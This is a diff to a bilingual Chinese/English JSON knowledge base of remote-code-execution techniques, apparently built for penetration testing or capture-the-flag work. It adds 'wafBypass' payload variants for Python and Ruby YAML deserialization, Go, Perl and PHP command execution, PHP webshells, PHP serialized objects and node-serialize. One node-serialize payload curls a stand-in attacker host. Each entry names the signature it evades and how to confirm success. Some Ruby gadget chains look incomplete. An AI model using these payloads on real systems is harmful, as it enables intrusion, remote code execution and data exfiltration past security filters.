+            "en": "Builds an os.popen object via the object/new tag, avoiding the apply:os.system literal. Success: read() yields the output."
+          }
+        },
+        {
+          "title": {
+            "zh": "编码命令变体",
+            "en": "Encoded Command Variant"
+          },
+          "command": "!!python/object/apply:os.system [\"echo Y2F0IC9mbGFn|base64 -d|sh\"]",
+          "description": {
+            "zh": "命令以 base64 管道形态传入，绕过 /flag 等敏感路径明文；成功判据：解码后读取成功。",
+            "en": "Delivers the command as a base64 pipeline to evade plaintext sensitive paths like /flag. Success: the decoded command reads the file."
+          }
+        }
       ]
     },
     {
@@ -4683,8 +5184,8 @@
         "en": "RCE Remote Code Execution"
       },
       "subCategory": {
-        "zh": "Go 进程与文件 API",
-        "en": "Go Process and File APIs"
+        "zh": "WebShell 与权限维持",
+        "en": "WebShell & Persistence"
       },
       "tutorial": {
         "overview": {
@@ -4789,6 +5290,41 @@
           "zh": "Go os/exec 与文件读取片段清理条件：结束后删除标记与临时脚本，关闭全部子进程，重建 worker，并确认日志未残留凭据、命令输出或业务数据。 清理完成后再次确认该技术路径没有残留可触发状态。",
           "en": "Go os-exec and File-Read Snippets cleanup condition: Remove markers and temporary scripts, terminate child processes, rebuild the worker, and verify logs contain no credentials, command output, or business data. Recheck that no triggerable state remains for this technique."
         }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "sh -c 参数化变体",
+            "en": "sh -c Parameterized Variant"
+          },
+          "command": "exec.Command(\"/bin/sh\",\"-c\",request.FormValue(\"c\")).Output()",
+          "description": {
+            "zh": "经 /bin/sh -c 执行请求参数，绕过固定命令名与 Go API 直呼特征；成功判据：响应返回命令输出。",
+            "en": "Executes the request parameter via /bin/sh -c to evade fixed command names and direct Go API signatures. Success: response carries command output."
+          }
+        },
+        {
+          "title": {
+            "zh": "syscall.Exec 变体",
+            "en": "syscall.Exec Variant"
+          },
+          "command": "syscall.Exec(\"/bin/sh\",[]string{\"sh\",\"-c\",\"cat /flag\"},os.Environ())",
+          "description": {
+            "zh": "用 syscall.Exec 替换进程映像执行，完全避开 os/exec 包特征；成功判据：进程执行且 flag 可见。",
+            "en": "Replaces the process image via syscall.Exec to avoid os/exec package signatures entirely. Success: process runs and flag is visible."
+          }
+        },
+        {
+          "title": {
+            "zh": "输出管道变体",
+            "en": "StdoutPipe Variant"
+          },
+          "command": "cmd:=exec.Command(\"i\"+\"d\");out,_:=cmd.StdoutPipe();cmd.Start();io.Copy(os.Stdout,out)",
+          "description": {
+            "zh": "命令名拼接 + 管道读输出，规避 exec.Command(\"id\") 静态特征；成功判据：输出被复制返回。",
+            "en": "Splices the command name and reads via pipe to evade the static exec.Command(\"id\") signature. Success: output copied back."
+          }
+        }
       ]
     },
     {
@@ -4806,8 +5342,8 @@
         "en": "RCE Remote Code Execution"
       },
       "subCategory": {
-        "zh": "Perl 进程执行",
-        "en": "Perl Process Execution"
+        "zh": "WebShell 与权限维持",
+        "en": "WebShell & Persistence"
       },
       "tutorial": {
         "overview": {
@@ -4912,6 +5448,41 @@
           "zh": "Perl system 与管道执行片段清理条件：结束后删除标记与临时脚本，关闭全部子进程，重建 worker，并确认日志未残留凭据、命令输出或业务数据。 清理完成后再次确认该技术路径没有残留可触发状态。",
           "en": "Perl System and Pipe Execution Snippets cleanup condition: Remove markers and temporary scripts, terminate child processes, rebuild the worker, and verify logs contain no credentials, command output, or business data. Recheck that no triggerable state remains for this technique."
         }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "反引号执行变体",
+            "en": "Backtick Execution Variant"
+          },
+          "command": "print `id`",
+          "description": {
+            "zh": "绕过 system( 检测：反引号捕获输出后打印；成功判据：uid 回显。",
+            "en": "Bypasses system( detection by capturing output with backticks. Success: uid echoed."
+          }
+        },
+        {
+          "title": {
+            "zh": "管道 open 变体",
+            "en": "Pipe open Variant"
+          },
+          "command": "open(F,\"cat /flag|\");print <F>;close F",
+          "description": {
+            "zh": "以管道模式 open 文件句柄执行命令，规避 system/exec 关键词；成功判据：flag 内容输出。",
+            "en": "Opens a piped filehandle to run the command, evading system/exec keywords. Success: flag contents printed."
+          }
+        },
+        {
+          "title": {
+            "zh": "qx 定界符变体",
+            "en": "qx Delimiter Variant"
+          },
+          "command": "print qx{whoami}",
+          "description": {
+            "zh": "qx{} 花括号定界执行，规避对反引号与 qx() 的规则；成功判据：用户名返回。",
+            "en": "Uses qx{} brace delimiters to evade rules on backticks and qx(). Success: username returned."
+          }
+        }
       ]
     },
     {
@@ -4929,8 +5500,8 @@
         "en": "RCE Remote Code Execution"
       },
       "subCategory": {
-        "zh": "PHP WebShell 文件读取",
-        "en": "PHP Webshell File Reading"
+        "zh": "WebShell 与权限维持",
+        "en": "WebShell & Persistence"
       },
       "tutorial": {
         "overview": {
@@ -5031,6 +5602,41 @@
         {
           "zh": "PHP 源码与本地文件读取片段清理条件：测试后删除挂载文件和临时 WebShell，清空响应缓存并重建容器，确认报告与日志只保留随机标记。 清理完成后再次确认该技术路径没有残留可触发状态。",
           "en": "PHP Source and Local File Read Snippets cleanup condition: Remove mounted files and temporary webshells, clear response caches, rebuild the container, and verify reports and logs retain only the random marker. Recheck that no triggerable state remains for this technique."
+        }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "readfile 变体",
+            "en": "readfile Variant"
+          },
+          "command": "<?php readfile('/flag');?>",
+          "description": {
+            "zh": "绕过对 file_get_contents 关键词的查杀：readfile 直读直出；成功判据：flag 内容输出。",
+            "en": "Bypasses killing of file_get_contents by streaming via readfile. Success: flag contents output."
+          }
+        },
+        {
+          "title": {
+            "zh": "include 输出变体",
+            "en": "include Output Variant"
+          },
+          "command": "<?php include('/flag');?>",
+          "description": {
+            "zh": "利用 include 对非 PHP 内容的原样输出特性读文件，避开读文件函数特征；成功判据：内容被打印。",
+            "en": "Exploits include echoing non-PHP content verbatim to avoid read-function signatures. Success: contents printed."
+          }
+        },
+        {
+          "title": {
+            "zh": "函数名拼接变体",
+            "en": "Function-Name Splicing Variant"
+          },
+          "command": "<?php $f='file_'.'get_'.'contents';echo $f('/flag');?>",
+          "description": {
+            "zh": "动态函数名拼接调用，规避 file_get_contents 完整 token；成功判据：flag 回显。",
+            "en": "Calls via a spliced dynamic function name to evade the full file_get_contents token. Success: flag echoed."
+          }
         }
       ]
     },
@@ -5172,8 +5778,8 @@
         "en": "RCE Remote Code Execution"
       },
       "subCategory": {
-        "zh": "PHP 不安全反序列化",
-        "en": "Unsafe PHP Deserialization"
+        "zh": "反序列化",
+        "en": "Insecure Deserialization"
       },
       "tutorial": {
         "overview": {
@@ -5277,6 +5883,41 @@
         {
           "zh": "PHP 序列化对象与内部类探针清理条件：每个对象使用新进程；测试后销毁进程、临时目录和缓存，轮换测试会话材料，并确认类、原型或全局状态无残留。 清理完成后再次确认该技术路径没有残留可触发状态。",
           "en": "PHP Serialized Objects and Internal-Class Probes cleanup condition: Use a fresh process per object; destroy processes, temporary directories, and caches, rotate test session material, and verify no class, prototype, or global state remains. Recheck that no triggerable state remains for this technique."
+        }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "S 型十六进制字符串键",
+            "en": "S-type Hex String Key"
+          },
+          "command": "O:1:\"A\":1:{S:3:\"\\76\\61\\72\";s:3:\"123\";}",
+          "description": {
+            "zh": "用 S(十六进制字符串) 类型替代 s，绕过对 s:3:\"var\" 结构的匹配；成功判据：unserialize 成功且魔术方法触发。",
+            "en": "Replaces the s type with S (hex string) to evade matching of the s:3:\"var\" structure. Success: unserialize succeeds and magic methods fire."
+          }
+        },
+        {
+          "title": {
+            "zh": "数组包裹变体",
+            "en": "Array-Wrapped Variant"
+          },
+          "command": "a:1:{i:0;O:1:\"A\":0:{}}",
+          "description": {
+            "zh": "对象嵌进数组元素，规避以 O: 开头的整串特征；成功判据：反序列化链被正常解析执行。",
+            "en": "Nests the object inside an array element to evade signatures anchored on a leading O:. Success: the deserialization chain parses and executes."
+          }
+        },
+        {
+          "title": {
+            "zh": "类名大小写变体",
+            "en": "Class-Name Case Variant"
+          },
+          "command": "O:1:\"a\":1:{s:3:\"var\";s:3:\"123\";}",
+          "description": {
+            "zh": "利用 PHP 类名大小写不敏感特性改小写类名，绕过精确匹配 \"A\" 的规则；成功判据：目标类仍被实例化。",
+            "en": "Exploits PHP class-name case insensitivity with a lowercase name to bypass exact-match rules on \"A\". Success: the target class is still instantiated."
+          }
         }
       ]
     },
@@ -5541,8 +6182,8 @@
         "en": "RCE Remote Code Execution"
       },
       "subCategory": {
-        "zh": "Node.js 函数反序列化",
-        "en": "Node.js Function Deserialization"
+        "zh": "反序列化",
+        "en": "Insecure Deserialization"
       },
       "tutorial": {
         "overview": {
@@ -5646,6 +6287,41 @@
         {
           "zh": "node-serialize 函数字符串反序列化清理条件：每个对象使用新进程；测试后销毁进程、临时目录和缓存，轮换测试会话材料，并确认类、原型或全局状态无残留。 清理完成后再次确认该技术路径没有残留可触发状态。",
           "en": "Node-Serialize Function-String Deserialization cleanup condition: Use a fresh process per object; destroy processes, temporary directories, and caches, rotate test session material, and verify no class, prototype, or global state remains. Recheck that no triggerable state remains for this technique."
+        }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "函数名后空格变形",
+            "en": "Function-Name Spacing Mutation"
+          },
+          "command": "{\"rce\":\"_$$ND_FUNC$$_function (){return require('child_process').execSync('cat /flag').toString()}\"}",
+          "description": {
+            "zh": "在 function 与 () 之间插入空格打断 _$$ND_FUNC$$_function(){ 的固定特征；成功判据：serialize.unserialize 执行读文件。",
+            "en": "Inserts a space between function and () to break the fixed _$$ND_FUNC$$_function(){ signature. Success: serialize.unserialize reads the file."
+          }
+        },
+        {
+          "title": {
+            "zh": "IIFE 附加执行变体",
+            "en": "IIFE Appended Execution"
+          },
+          "command": "{\"rce\":\"_$$ND_FUNC$$_function(){return require('child'+'_process').exec('curl http://{ATTACKER_HOST}/n')()}\"}",
+          "description": {
+            "zh": "尾接 () 立即执行并以 require 拼接隐藏模块名，命令改 curl 外带；成功判据：{ATTACKER_HOST} 收到请求。",
+            "en": "Appends () for immediate execution, hides the module via require splicing, and exfils with curl. Success: {ATTACKER_HOST} receives the request."
+          }
+        },
+        {
+          "title": {
+            "zh": "global 对象链变体",
+            "en": "global Object Chain Variant"
+          },
+          "command": "{\"rce\":\"_$$ND_FUNC$$_function(){return global.process.mainModule.constructor._load('child_process').execSync('id|base64').toString()}\"}",
+          "description": {
+            "zh": "经 constructor._load 加载模块并 base64 外带输出，绕过 require/execSync 明文对；成功判据：回传数据可解码出 uid。",
+            "en": "Loads the module via constructor._load and exfils base64 output, evading the require/execSync plaintext pair. Success: returned data decodes to uid."
+          }
         }
       ]
     },
@@ -6206,8 +6882,8 @@
         "en": "RCE Remote Code Execution"
       },
       "subCategory": {
-        "zh": "Ruby YAML Gadget 链",
-        "en": "Ruby YAML Gadget Chain"
+        "zh": "反序列化",
+        "en": "Insecure Deserialization"
       },
       "tutorial": {
         "overview": {
@@ -6308,6 +6984,41 @@
         {
           "zh": "RubyGems YAML Gadget 对象图清理条件：每个对象使用新进程；测试后销毁进程、临时目录和缓存，轮换测试会话材料，并确认类、原型或全局状态无残留。 清理完成后再次确认该技术路径没有残留可触发状态。",
           "en": "RubyGems YAML Gadget Object Graph cleanup condition: Use a fresh process per object; destroy processes, temporary directories, and caches, rotate test session material, and verify no class, prototype, or global state remains. Recheck that no triggerable state remains for this technique."
+        }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "Universal Gadget 变体",
+            "en": "Universal Gadget Variant"
+          },
+          "command": "--- !ruby/object:Gem::Installer\n    i: !ruby/object:Gem::Package::TarReader\n    io: !ruby/object:Net::WriteAdapter\n     socket: !ruby/object:Gem::RequestSet\n        sets: !ruby/object:Net::WriteAdapter\n         socket: !ruby/object:Gem::Requirement\n          requirements: !ruby/object:Net::WriteAdapter\n           socket: !ruby/object:Zlib::GzipWriter",
+          "description": {
+            "zh": "使用 universal_deserialize 通用链结构，绕过针对 Gem::SpecFetcher 单点特征的检测；成功判据：链尾方法执行（OAST 验证）。",
+            "en": "Uses the universal_deserialize generic chain to evade single-point Gem::SpecFetcher signatures. Success: terminal chain method executes (verify via OAST)."
+          }
+        },
+        {
+          "title": {
+            "zh": "ERB 模板执行变体",
+            "en": "ERB Template Execution Variant"
+          },
+          "command": "--- !ruby/object:ERB\n  s: <%= `id` %>",
+          "description": {
+            "zh": "改走 ERB 模板渲染路径，反引号执行系统命令，规避 Gem gadget 类名特征；成功判据：result 渲染时输出 uid。",
+            "en": "Switches to ERB rendering with backtick execution, evading Gem gadget class-name signatures. Success: result outputs uid when rendered."
+          }
+        },
+        {
+          "title": {
+            "zh": "Base64 命令注入 gadget",
+            "en": "Base64 Command in Gadget"
+          },
+          "command": "--- !ruby/object:Gem::Installer\n    i: x\n--- !ruby/object:Gem::SpecFetcher\n    i: y\n--- !ruby/object:Gem::Requirement\n    requirements:\n      -:id|base64",
+          "description": {
+            "zh": "命令链尾以 base64 输出结果，规避命令明文；成功判据：执行结果以 base64 形态可回收。",
+            "en": "Pipes the terminal command output through base64 to evade plaintext commands. Success: result is recoverable as base64."
+          }
         }
       ]
     }
